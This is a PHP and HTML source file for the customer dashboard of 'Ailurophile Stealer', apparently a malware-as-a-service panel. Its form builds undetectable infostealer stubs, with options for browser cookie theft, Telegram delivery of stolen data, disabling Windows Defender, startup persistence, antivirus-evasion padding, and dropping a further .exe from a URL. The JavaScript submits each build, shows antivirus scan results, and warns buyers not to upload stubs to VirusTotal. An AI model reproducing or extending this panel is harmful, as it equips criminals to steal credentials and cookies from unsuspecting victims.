<!DOCTYPE html>
<html lang="en"> <!--begin::Head-->
<?php
session_start();
include __DIR__ . "/api/config.php";

if (!isset($_SESSION['user_id'])) {
    header("Location: /login");
    exit();
}

$user_id = $_SESSION['user_id'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user) {
    $username = $user['username'];
    $role = $user['role'];
}
?>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Ailurophile Stealer | Dashboard</title><!--begin::Primary Meta Tags-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="title" content="Ailurophile Stealer | Dashboard">
    <meta name="author" content="Ailurophile Stealer | Dashboard">
    <meta name="description" content="Ailurophile Stealer | Dashboard">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/source-sans-3@5.0.12/index.css" integrity="sha256-tXJfXfp6Ewt1ilPzLDtQnJV4hclT9XuaZUKyUvmyr+Q=" crossorigin="anonymous"><!--end::Fonts--><!--begin::Third Party Plugin(OverlayScrollbars)-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@2.3.0/styles/overlayscrollbars.min.css" integrity="sha256-dSokZseQNT08wYEWiz5iLI8QPlKxG+TswNRD8k35cpg=" crossorigin="anonymous"><!--end::Third Party Plugin(OverlayScrollbars)--><!--begin::Third Party Plugin(Bootstrap Icons)-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.min.css" integrity="sha256-Qsx5lrStHZyR9REqhUF8iQt73X06c8LGIUPzpOhwRrI=" crossorigin="anonymous"><!--end::Third Party Plugin(Bootstrap Icons)--><!--begin::Required Plugin(AdminLTE)-->
    <link rel="stylesheet" href="adminlte/css/adminlte.css"><!--end::Required Plugin(AdminLTE)--><!-- apexcharts -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/apexcharts@3.37.1/dist/apexcharts.css" integrity="sha256-4MX+61mt9NVvvuPjUWdUdyfZfxSB1/Rf9WtqRHgG5S0=" crossorigin="anonymous"><!-- jsvectormap -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/css/jsvectormap.min.css" integrity="sha256-+uGLJmmTKOqBr+2E6KDYs/NRsHxSkONXFHUL0fy2O/4=" crossorigin="anonymous">
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Thêm Bootstrap JS nếu cần -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js"></script>
</head> <!--end::Head--> <!--begin::Body-->

<body class="layout-fixed sidebar-expand-lg bg-body-tertiary"> <!--begin::App Wrapper-->
    <div class="app-wrapper"> <!--begin::Header-->
        <nav class="app-header navbar navbar-expand bg-body"> <!--begin::Container-->
            <div class="container-fluid"> <!--begin::Start Navbar Links-->
                <ul class="navbar-nav">
                    <li class="nav-item"> <a class="nav-link" data-lte-toggle="sidebar" href="#" role="button"> <i class="bi bi-list"></i> </a> </li>
                    <li class="nav-item d-none d-md-block"> <a href="#" class="nav-link">Home</a> </li>
                </ul> <!--end::Start Navbar Links--> <!--begin::End Navbar Links-->
                  </div> <!--end::Container-->
        </nav> <!--end::Header--> <!--begin::Sidebar-->
        <aside class="app-sidebar bg-body-secondary shadow" data-bs-theme="dark"> <!--begin::Sidebar Brand-->
            <div class="sidebar-brand"> <!--begin::Brand Link--> <a href="/dashboard" class="brand-link"> <!--begin::Brand Image--> <img src="cat.png" alt="AdminLTE Logo" class="brand-image opacity-75 shadow"> <!--end::Brand Image--> <!--begin::Brand Text--> <span class="brand-text fw-light"><?php  if($role==2){echo "Standard Member";} elseif($role==3){echo "Premium Member";} elseif($role==4){echo "VIP Member";} else{echo "New Member";}; ?></span> <!--end::Brand Text--> </a> <!--end::Brand Link--> </div> <!--end::Sidebar Brand--> <!--begin::Sidebar Wrapper-->
            <div class="sidebar-wrapper">
                <nav class="mt-2"> <!--begin::Sidebar Menu-->
                 <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
    <li class="nav-item">
        <a href="/dashboard" class="nav-link">
            <i class="nav-icon fas fa-tachometer-alt"></i>
            <p>Dashboard</p>
        </a>
    </li>
	<li class="nav-item">
        <a href="/stats" class="nav-link">
            <i class="nav-icon fas fa-tachometer-alt"></i>
            <p>Stats</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/subscription" class="nav-link">
            <i class="nav-icon fas fa-th"></i>
            <p>Subscription</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/bot" class="nav-link">
            <i class="nav-icon fas fa-robot"></i> <!-- Thay đổi icon -->
            <p>My Bots</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/settings" class="nav-link">
            <i class="nav-icon fas fa-cog"></i>
            <p>Settings</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/cookie" class="nav-link">
            <i class="nav-icon fas fa-cookie"></i> <!-- Thay đổi icon -->
            <p>Convert Cookie</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/ref" class="nav-link">
            <i class="nav-icon fas fa-users"></i> <!-- Thay đổi icon -->
            <p>Referral Program</p>
        </a>
    </li>
</ul>
      </nav>
            </div> <!--end::Sidebar Wrapper-->
        </aside> <!--end::Sidebar--> <!--begin::App Main-->
        <main class="app-main"> <!--begin::App Content Header-->
            <div class="app-content-header"> <!--begin::Container-->
                <div class="container-fluid"> <!--begin::Row-->
                    <div class="row">
                        <div class="col-sm-6">
                            <h3 class="mb-0">Dashboard</h3>
                        </div>
                        <div class="col-sm-6">
                            <ol class="breadcrumb float-sm-end">
                                <li class="breadcrumb-item"><a href="#">Home</a></li>
                                <li class="breadcrumb-item active" aria-current="page">
                                    Dashboard
                                </li>
                            </ol>
                        </div>
                    </div> <!--end::Row-->
                </div> <!--end::Container-->
            </div> <!--end::App Content Header--> <!--begin::App Content-->
            <div class="app-content"> <!--begin::Container-->
                <div class="container-fluid"> <!--begin::Row-->
                    <div class="row"> <!--begin::Col-->
					    <div class="col-sm-12 col-xl-6">
                <div class="card card-primary">
                    <div class="card-header">
                        <h6 class="mb-0">MAKE CRAZY FUD STEALER STUB EVERYDAY</h6>
                    </div>
                    <div class="card-body">
                        <form>
                            <h6 class="mb-4">Ailurophile Version (Only for VIP member)</h6>
                            <select name="verstub" id="verstub" class="form-control mb-3" <?php if($role != "4"){echo "disabled";} ?>>
                                <option value="v1" selected>Version 1.4 - Displays console for tricking purposes, stable usage, long-lasting undetected (Gecko currently has issues).</option>
                                <?php if($role == "4"): ?>
                                    <option value="v2">Version 2.1 - Shows CMD for 1 second, fast processing (Gecko currently has issues).</option>
									<option value="v3">Version 3.0 - No CMD display, new cookie extraction method (works with the latest Chromium and Gecko).</option>
                                <?php endif; ?>
                            </select>

                            <h6 class="mb-4">Assembly Information</h6>
                            <div class="form-group mb-3">
                                <label class="form-label">Product Name</label>
                                <input type="text" name="product_name" class="form-control" id="product_name" <?php if($role=="1"){echo "disabled";} ?>>
                            </div>
                            <div class="form-group mb-3">
                                <label class="form-label">File description</label>
                                <input type="text" name="file_description" class="form-control" id="file_description" disabled>
                            </div>
                            <div class="form-group mb-3">
                                <label class="form-label">File Version (1.0.0.1)</label>
                                <input type="text" name="file_version" class="form-control" id="file_version" disabled>
                            </div>
                            <div class="form-group mb-3">
                                <label class="form-label">Product Version (1.0)</label>
                                <input type="text" name="product_version" class="form-control" id="product_version" disabled>
                            </div>
                            <div class="form-group mb-3">
                                <label class="form-label">Copyright</label>
                                <input type="text" name="copyright" class="form-control" id="copyright" disabled>
                            </div>
                            <div class="form-group mb-3">
                                <label class="form-label">Legal Trademarks</label>
                                <input type="text" name="legal_trademarks" class="form-control" id="legal_trademarks" disabled>
                            </div>
                            <div class="form-group mb-3">
                                <label class="form-label">Original Filename</label>
                                <input type="text" name="original_filename" class="form-control" id="original_filename" disabled>
                            </div>
                            <div class="form-group mb-3">
                                <label for="formFile" class="form-label">Icon (.ico only)</label>
                                <input type="file" class="custom-file-input" type="file" id="formFile" name="icon">
                            </div>

                            <h6 class="mb-4">Telegram notify</h6>
                            <div class="form-group mb-3">
                                <label class="form-label">Bot token</label>
                                <input type="text" name="bot_token" class="form-control" id="bot_token">
                            </div>
                            <div class="form-group mb-3">
                                <label class="form-label">Chat id</label>
                                <input type="text" name="chat_id" class="form-control" id="chat_id">
                            </div>

                            <h6 class="mb-4">Other options</h6>
                            <div class="form-check mb-3">
                                <input class="form-check-input" name="mix_stub" type="checkbox" id="gridCheck2" disabled>
                                <label class="form-check-label" for="gridCheck2">Mix stub for long FUD</label>
                            </div>
                            <div class="form-check mb-3">
                                <input class="form-check-input" name="pump_file" type="checkbox" id="gridCheck3" disabled>
                                <label class="form-check-label" for="gridCheck3">Pump file</label>
                            </div>

                            <h6 class="mb-4">Delivery</h6>
                            <div class="form-check mb-3">
                                <input class="form-check-input" name="disable_wd" type="checkbox" id="gridCheck1" <?php if($role!="3" && $role!="4"){echo "disabled";} ?>>
                                <label class="form-check-label" for="gridCheck1">Disable windows defender</label>
                            </div>
                            <div class="form-check mb-3">
                                <input class="form-check-input" name="startup" type="checkbox" id="gridCheck4" disabled>
                                <label class="form-check-label" for="gridCheck4">Startup</label>
                            </div>

                            <div class="form-group mb-3">
                                <label class="form-label">Url other stub (.exe) for delivery (leave it null if don't use)</label>
                                <input type="text" name="url_stub" class="form-control" id="url_stub" <?php if($role!="3" && $role!="4"){echo "disabled";} ?>>
                            </div>

                            <button type="submit" class="btn btn-primary">Make stub</button>
                        </form>
                    </div>
                </div>
            </div>

            <!-- Info Section -->
            <div class="col-sm-12 col-xl-6">
                <div class="card card-info">
                    <div class="card-header">
                        <h6 class="mb-0">Read carefully before making stub</h6>
                    </div>
                    <div class="card-body">
                        <dl class="row mb-0">
                            <dt class="col-sm-4">About free trial</dt>
                            <dd class="col-sm-8">Free trial will have stub for testing how the stealer works. It can be detected by Antivirus. If you want FUD, please buy a package.</dd>

                            <dt class="col-sm-4">Assembly information</dt>
                            <dd class="col-sm-8">If you enter the incorrect format or leave any line blank, the system will automatically set that line to null.</dd>

                            <dt class="col-sm-4">Telegram notify</dt>
                            <dd class="col-sm-8">Please enter the bot token and chat ID in the correct format. If you don't know what it is, contact support for assistance.</dd>

                            <dt class="col-sm-4">Mix stub and pumpfile</dt>
                            <dd class="col-sm-8">Normally, the stub can last for over 15 days depending on the situation; if you mix the stub and pumpfile, it can last up to one month.</dd>

                            <dt class="col-sm-4 text-truncate">Disable WD and delivery</dt>
                            <dd class="col-sm-8">Disabling Windows Defender may not work in some cases, and delivery may cause the stub to be detected.</dd>
                        </dl>
                    </div>
                </div>
            </div>
<!-- Modal Loading -->
<div class="modal fade" id="loadingModal" tabindex="-1" aria-labelledby="loadingTitle" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-body text-center">
                <div class="spinner-border text-primary" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>
                <p class="mt-3">Processing, please wait...</p>
            </div>
        </div>
    </div>
</div>

<!-- Modal Result -->
<div class="modal fade" id="resultModal" tabindex="-1" aria-labelledby="modalTitle" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="modalTitle"></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <!-- Progress bar for loading indication -->
                <div id="scanProgress" style="display: none;">
                    <p>Waiting. We are scanning stub...</p>
                    <div class="progress">
                        <div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated" 
                             role="progressbar" style="width: 0%" aria-valuemin="0" aria-valuemax="100">
                        </div>
                    </div>
                </div>
                <!-- Message content -->
                <p id="modalMessage"></p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

					
                                  </div> <!--end::Row--> <!--begin::Row-->
                   </div> <!--end::Container-->
            </div> <!--end::App Content-->
        </main> <!--end::App Main--> <!--begin::Footer-->
        <footer class="app-footer"> <!--begin::To the end-->
            <div class="float-end d-none d-sm-inline"></div> <!--end::To the end--> <!--begin::Copyright--> <strong>
                Ailuriophile Stealer&nbsp;
                <a href="https://t.me/ailurophilevn" class="text-decoration-none">@Ailurophilevn</a>.
            </strong>
            Official Website.
            <!--end::Copyright-->
        </footer> <!--end::Footer-->
    </div> <!--end::App Wrapper--> <!--begin::Script--> <!--begin::Third Party Plugin(OverlayScrollbars)-->
    <script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@2.3.0/browser/overlayscrollbars.browser.es6.min.js" integrity="sha256-H2VM7BKda+v2Z4+DRy69uknwxjyDRhszjXFhsL4gD3w=" crossorigin="anonymous"></script> <!--end::Third Party Plugin(OverlayScrollbars)--><!--begin::Required Plugin(popperjs for Bootstrap 5)-->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha256-whL0tQWoY1Ku1iskqPFvmZ+CHsvmRWx/PIoEvIeWh4I=" crossorigin="anonymous"></script> <!--end::Required Plugin(popperjs for Bootstrap 5)--><!--begin::Required Plugin(Bootstrap 5)-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha256-YMa+wAM6QkVyz999odX7lPRxkoYAan8suedu4k2Zur8=" crossorigin="anonymous"></script> <!--end::Required Plugin(Bootstrap 5)--><!--begin::Required Plugin(AdminLTE)-->
    <script src="adminlte/js/adminlte.js"></script> <!--end::Required Plugin(AdminLTE)--><!--begin::OverlayScrollbars Configure-->
     <script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.0/Sortable.min.js" integrity="sha256-ipiJrswvAR4VAx/th+6zWsdeYmVae0iJuiR+6OqHJHQ=" crossorigin="anonymous"></script> <!-- sortablejs -->
     <script src="https://cdn.jsdelivr.net/npm/apexcharts@3.37.1/dist/apexcharts.min.js" integrity="sha256-+vh8GkaU7C9/wbSLIcwq82tQ2wTf44aOHA8HlBMwRI8=" crossorigin="anonymous"></script> <!-- ChartJS -->
    <script src="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/js/jsvectormap.min.js" integrity="sha256-/t1nN2956BT869E6H4V1dnt0X5pAQHPytli+1nTZm2Y=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/maps/world.js" integrity="sha256-XPpPaZlU8S/HWf7FZLAncLg2SAkP8ScUTII89x9D3lY=" crossorigin="anonymous"></script> <!-- jsvectormap -->
 </body><!--end::Body-->
 <script>
$(document).ready(function() {
    $('form').on('submit', function(e) {
        e.preventDefault(); // Ngăn không cho form gửi đi theo cách thông thường

        var formData = new FormData(this); // Lấy toàn bộ dữ liệu từ form

        $.ajax({
            url: '/makestub',
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            beforeSend: function() {
                // Hiển thị modal loading trước khi bắt đầu gửi AJAX
                $('#loadingModal').modal('show');
            },
            success: function(response) {
                // Ẩn modal loading khi có kết quả
                $('#loadingModal').modal('hide');

                // Chuyển đổi JSON response thành object
                var result;
                try {
                    result = JSON.parse(response);
                } catch (e) {
                    $('#modalTitle').text('Error');
                    $('#modalMessage').text('Invalid server response.');
                    $('#resultModal').modal('show');
                    return;
                }

                // Kiểm tra trạng thái và hiển thị thông báo ban đầu lên modal
                if (result.status === 'success') {
                    $('#modalTitle').text('Success').css('color', 'green');
                    $('#modalMessage').html(
                        'Please wait, the scan is in progress...<br><br>' +
                        '<strong>Scan Results:</strong><br>'
                    );

                    // Hiển thị và đặt lại progress bar
                    $('#scanProgress').show();
                    $('#progressBar').css('width', '0%');

                    // Thực hiện yêu cầu thứ hai để lấy kết quả quét
                    $.ajax({
                        url: '/api/scan',
                        type: 'POST',
                        data: { scan_token: result.token_file },
                        beforeSend: function() {
                            // Khởi động progress bar khi bắt đầu quét
                            var progress = 0;
                            var interval = setInterval(function() {
                                if (progress < 90) { // Tăng dần đến 90%
                                    progress += 10;
                                    $('#progressBar').css('width', progress + '%');
                                }
                            }, 500);
                            $('#resultModal').on('hidden.bs.modal', function () {
                                clearInterval(interval); // Dừng tiến trình nếu modal bị đóng
                            });
                        },
                        success: function(scanResponse) {
                            // Dừng tiến trình và hoàn tất tiến trình
                            $('#progressBar').css('width', '100%');
                            $('#scanProgress').hide();

                            var totalScans = scanResponse.length;
                            var undetectedCount = 0;
                            var incompleteCount = 0;
                            var scanResults = '';

                            scanResponse.forEach(function(scan) {
                                var avnameFormatted = '<strong>' + scan.avname + '</strong>';
                                if (scan.flagname === "Undetected") {
                                    undetectedCount++;
                                    scanResults += '<span style="color: green;">' + avnameFormatted + ' - ' + scan.flagname + '</span><br>';
                                } else if (scan.flagname === "Scanning results incomplete") {
                                    incompleteCount++;
                                    scanResults += '<span style="color: gray;">' + avnameFormatted + ' - ' + scan.flagname + '</span><br>';
                                } else {
                                    scanResults += '<span style="color: red;">' + avnameFormatted + ' - ' + scan.flagname + '</span><br>';
                                }
                            });

                            // Tính toán kết quả hiển thị
                            var detectedCount = totalScans - undetectedCount - incompleteCount;
                            var summary = '<strong>Scan Results: (' + detectedCount + '/' + totalScans + ')</strong><br>';

                            // Cập nhật và hiển thị kết quả quét và link download trong modal
                            $('#modalMessage').html(
                                'Link download will expire within 60 minutes. DO NOT UPLOAD FILE TO VIRUSTOTAL FOR LONG FUD STUB. ' +
                                'Password for extract: ' + result.password + '<br><br>' +
                                'After extracting, please rename the file and add .exe to the end.<br><br>' +
                                summary + scanResults +
                                '<br><strong>Download link: </strong><a href="' + result.message + '">Download</a><br><br>'
                            );
                        },
                        error: function(xhr, status, error) {
                            $('#scanProgress').hide();
                            $('#modalMessage').html(
                                '<strong>Scan system is currently experiencing issues, but the download link is still available.</strong><br>' +
                                'Link download will expire within 60 minutes. DO NOT UPLOAD FILE TO VIRUSTOTAL FOR LONG FUD STUB. ' +
                                'Password for extract: ' + result.password + '<br><br>' +
                                'After extracting, please rename the file and add .exe to the end.<br><br>' +
                                '<strong>Download link: </strong><a href="' + result.message + '">Download</a><br><br>'
                            );
                        }
                    });
                } else {
                    $('#modalTitle').text('Error');
                    $('#modalMessage').text(result.message);
                }

                // Hiển thị modal kết quả
                $('#resultModal').modal('show');
            },
            error: function(xhr, status, error) {
                // Ẩn modal loading khi xảy ra lỗi
                $('#loadingModal').modal('hide');

                $('#modalTitle').text('Error');
                $('#modalMessage').text('An unexpected error occurred: ' + error);
                $('#resultModal').modal('show');
            }
        });
    });
});
</script>




<script>
document.addEventListener('DOMContentLoaded', function () {
    var verstub = document.getElementById('verstub');
    var inputsToToggle = [
        'product_name', 'file_description', 'file_version', 'product_version',
        'copyright', 'legal_trademarks', 'original_filename',
        'gridCheck2', 'gridCheck3', 'gridCheck4', 'url_stub'
    ];
    var botToken = document.getElementById('bot_token');
    var chatId = document.getElementById('chat_id');

    // Function to toggle enable/disable fields based on verstub value
    function toggleFields() {
        var isV1 = verstub.value === 'v1';
        var isV2 = verstub.value === 'v2';
        var isV3 = verstub.value === 'v3';

        // Disable all fields for "v1" and "v3" by default
        inputsToToggle.forEach(function (id) {
            document.getElementById(id).disabled = isV1 || isV3;
        });

        // Enable all fields if "v2" is selected
        if (isV2) {
            inputsToToggle.forEach(function (id) {
                document.getElementById(id).disabled = false;
            });
            botToken.disabled = false;
            chatId.disabled = false;
        }

        // For "v3", enable only bot_token and chat_id
        if (isV3) {
            botToken.disabled = false;
            chatId.disabled = false;
        }
    }

    // Call on load to set initial state
    toggleFields();

    // Change event to handle when verstub changes
    verstub.addEventListener('change', function () {
        toggleFields();
    });
});
</script>


</html>